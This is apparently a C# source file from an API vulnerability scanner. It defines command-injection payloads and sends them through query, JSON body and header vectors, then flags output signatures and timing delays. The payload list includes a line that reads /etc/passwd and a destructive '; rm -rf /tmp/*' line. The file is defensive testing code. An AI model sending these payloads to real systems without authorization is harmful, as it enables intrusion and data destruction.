namespace API_Tester;

public partial class MainPage
{
    /*
    Command Injection Testing Payloads

    Purpose:
    Provides predefined payloads used to test whether the application is
    vulnerable to command injection attacks, where user-supplied input is
    executed as part of system commands.

    Threat Model:
    Applications that incorporate user input into system commands without
    proper validation or sanitization may allow attackers to:

        - Execute arbitrary operating system commands
        - Access sensitive files or system resources
        - Modify or delete critical system data
        - Escalate privileges or compromise the host environment

    Common vulnerabilities include:

        - Passing unsanitized user input to shell commands
        - Improper use of command execution APIs
        - Lack of input validation or command parameterization
        - Failure to restrict execution context or permissions

    Test Strategy:
    The method returns an array of command injection payloads designed to
    simulate malicious input. These payloads are used to determine whether
    the application improperly executes injected commands or exposes
    system-level functionality.

    Potential Impact:
    If command injection vulnerabilities exist, attackers may:

        - Execute unauthorized system commands
        - Access sensitive system files or environment variables
        - Compromise the application server or underlying infrastructure
        - Establish persistence or launch further attacks

    Expected Behavior:
    Applications should:

        - Never execute user input directly as system commands
        - Strictly validate and sanitize all input
        - Use safe APIs or parameterized command execution methods
        - Restrict permissions and execution contexts for system processes
        - Log and monitor suspicious command execution attempts
    */
    
    private static string[] GetCommandInjectionPayloads() =>
    [
        "; cat /etc/passwd",
        "&& whoami",
        "| id",
        "$(id)",
        "`id`",
        "; sleep 2",
        "& type C:\\Windows\\win.ini",
        "&& ping -n 2 127.0.0.1",
        "; ls -la",
        "&& uname -a",
        "; dir",
        "| netstat -an",
        "`netstat -an`",
        "; rm -rf /tmp/*",
        "`ping -c 4 127.0.0.1`"
    ];

    private HttpRequestMessage FormatCommandInjectionRequest(
        Uri endpoint,
        string payload,
        CommandInjectionVector vector,
        string[] queryFields,
        string[] bodyFields,
        string? jsonPayload = null)
    {
        return vector switch
        {
            CommandInjectionVector.Query => BuildCommandInjectionQueryRequest(endpoint, payload, queryFields),
            CommandInjectionVector.JsonBody => BuildCommandInjectionJsonBodyRequest(endpoint, payload, bodyFields),
            CommandInjectionVector.JsonPayload => BuildCommandInjectionJsonPayloadRequest(endpoint, jsonPayload ?? payload),
            CommandInjectionVector.Header => BuildCommandInjectionHeaderRequest(endpoint, payload),
            _ => new HttpRequestMessage(HttpMethod.Get, endpoint)
        };
    }

    private HttpRequestMessage BuildCommandInjectionQueryRequest(Uri endpoint, string payload, string[] queryFields)
    {
        var queryUri = AppendQuery(endpoint, queryFields.ToDictionary(q => q, _ => payload, StringComparer.OrdinalIgnoreCase));
        return new HttpRequestMessage(HttpMethod.Get, queryUri);
    }

    private static HttpRequestMessage BuildCommandInjectionJsonBodyRequest(Uri endpoint, string payload, string[] bodyFields)
    {
        var req = new HttpRequestMessage(HttpMethod.Post, endpoint);
        req.Content = new StringContent(
            JsonSerializer.Serialize(bodyFields.ToDictionary(k => k, _ => payload, StringComparer.OrdinalIgnoreCase)),
            Encoding.UTF8,
            "application/json");
        return req;
    }

    private static HttpRequestMessage BuildCommandInjectionJsonPayloadRequest(Uri endpoint, string jsonPayload)
    {
        var req = new HttpRequestMessage(HttpMethod.Post, endpoint);
        req.Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
        return req;
    }

    private static HttpRequestMessage BuildCommandInjectionHeaderRequest(Uri endpoint, string payload)
    {
        var req = new HttpRequestMessage(HttpMethod.Get, endpoint);
        req.Headers.TryAddWithoutValidation("X-Cmd", payload);
        return req;
    }

    private enum CommandInjectionVector
    {
        Query,
        JsonBody,
        JsonPayload,
        Header
    }

    private async Task<string> RunCommandInjectionTestsAsync(Uri baseUri)
    {
        var openApi = await GetOpenApiProbeContextAsync(baseUri);
        var payloads = GetCommandInjectionPayloads();
        var scanDepth = GetScanDepthProfile();
        payloads = GetManualPayloadsOrDefault(payloads, ManualPayloadCategory.Cmd);
        payloads = LimitByScanDepth(payloads, fastCount: 4, balancedCount: 6);
        var includeHeaderVector = scanDepth == "deep";
        var endpoints = (openApi.TargetEndpoints.Count > 0 ? openApi.TargetEndpoints : new List<Uri> { baseUri })
        .Take(scanDepth == "fast" ? 2 : scanDepth == "balanced" ? 4 : 8)
        .ToList();
        var commandLikelyNames = new[] { "cmd", "command", "exec", "shell", "script", "process", "args", "query", "search", "filter", "action", "task", "worker", "job", "input", "text" };
        var maxFields = scanDepth == "fast" ? 2 : scanDepth == "balanced" ? 4 : 8;

        var stringQueryFields = openApi.QueryParameterNames
        .Where(x => !string.IsNullOrWhiteSpace(x))
        .Where(x => !openApi.NonStringQueryParameterNames.Contains(x, StringComparer.OrdinalIgnoreCase))
        .Distinct(StringComparer.OrdinalIgnoreCase)
        .ToArray();
        var commandLikelyQueryFields = stringQueryFields
        .Where(x => commandLikelyNames.Any(name => x.Contains(name, StringComparison.OrdinalIgnoreCase)))
        .ToArray();
        var queryFields = commandLikelyQueryFields
        .Concat(stringQueryFields)
        .Distinct(StringComparer.OrdinalIgnoreCase)
        .Take(maxFields)
        .ToArray();
        if (queryFields.Length == 0)
        {
            queryFields = new[] { "cmd", "query" };
        }

        var stringBodyFields = openApi.BodyPropertyNames
        .Where(x => !string.IsNullOrWhiteSpace(x))
        .Where(x => !openApi.NonStringBodyPropertyNames.Contains(x, StringComparer.OrdinalIgnoreCase))
        .Distinct(StringComparer.OrdinalIgnoreCase)
        .ToArray();
        var commandLikelyBodyFields = stringBodyFields
        .Where(x => commandLikelyNames.Any(name => x.Contains(name, StringComparison.OrdinalIgnoreCase)))
        .ToArray();
        var bodyFields = commandLikelyBodyFields
        .Concat(stringBodyFields)
        .Distinct(StringComparer.OrdinalIgnoreCase)
        .Take(maxFields)
        .ToArray();
        if (bodyFields.Length == 0)
        {
            bodyFields = new[] { "cmd", "action" };
        }

        var findings = new List<string>();
        var signatureHits = 0;
        var timingHits = 0;
        var noResponse = 0;
        var attempts = 0;

        foreach (var endpoint in endpoints)
        {
            foreach (var payload in payloads)
            {
                var jsonBodies = BuildCommandJsonBodies(payload, bodyFields);

                async Task ProbeAsync(string vectorName, Func<HttpRequestMessage> requestFactory)
                {
                    var started = DateTime.UtcNow;
                    var response = await SafeSendAsync(requestFactory);
                    var elapsedMs = (DateTime.UtcNow - started).TotalMilliseconds;
                    var body = await ReadBodyAsync(response);
                    attempts++;

                    if (response is null)
                    {
                        noResponse++;
                        findings.Add($"{vectorName} payload '{payload}': no response.");
                        return;
                    }

                    findings.Add($"{vectorName} payload '{payload}': HTTP {(int)response.StatusCode} {response.StatusCode} ({elapsedMs:F0} ms)");
                    if (ContainsAny(body, "root:x:", "/bin/bash", "uid=", "www-data", "nt authority", "[extensions]"))
                    {
                        signatureHits++;
                    }

                    if (ContainsAny(payload, "sleep 2", "ping -n 2") && elapsedMs > 1500)
                    {
                        timingHits++;
                    }
                }

                foreach (var q in queryFields)
                {
                    await ProbeAsync("Query", () => FormatCommandInjectionRequest(endpoint, payload, CommandInjectionVector.Query, [q], bodyFields));
                }

                await ProbeAsync("JSON Body", () => FormatCommandInjectionRequest(endpoint, payload, CommandInjectionVector.JsonBody, queryFields, bodyFields));

                foreach (var jsonBody in jsonBodies)
                {
                    await ProbeAsync("JSON Payload", () => FormatCommandInjectionRequest(endpoint, payload, CommandInjectionVector.JsonPayload, queryFields, bodyFields, jsonBody));
                }

                if (includeHeaderVector)
                {
                    await ProbeAsync("Header", () => FormatCommandInjectionRequest(endpoint, payload, CommandInjectionVector.Header, queryFields, bodyFields));
                }
            }
        }
        findings.Add(noResponse == attempts
        ? "No responses received across command-injection probes."
        : signatureHits > 0 || timingHits > 0
        ? $"Potential risk: command execution indicators observed (output-signatures={signatureHits}, timing-anomalies={timingHits})."
        : "No obvious command injection indicators across tested vectors.");
        AddVerbosePayloadDetails(findings, payloads, queryFields, bodyFields);

        return FormatSection("Command Injection", baseUri, findings);
    }

}

